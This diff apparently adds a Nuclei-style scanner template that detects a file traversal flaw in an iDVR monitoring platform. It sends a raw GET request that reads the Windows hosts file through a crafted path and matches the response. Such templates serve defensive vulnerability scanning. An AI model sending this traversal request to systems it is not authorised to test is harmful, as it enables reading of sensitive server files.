@@ -1,0 +1,28 @@
+id: idvr-file-traversal
+
+info:
+  name: iDVR System File Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    IDVR multi-stage monitoring platform allows file traversal, potentially exposing sensitive files such as `C:/WINDOWS/system32/drivers/etc/hosts`. Exploitation can lead to sensitive information disclosure and server compromise.
+  reference:
+    - https://github.com/cflq3/poc/blob/master/bugscan/exp-2031.py
+  tags: disclosure,file-inclusion
+
+http:
+  - raw:
+      - |
+        GET /~C:/WINDOWS/system32/drivers/etc/hosts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This is a sample HOSTS file used by"
+          - "Microsoft Corp"
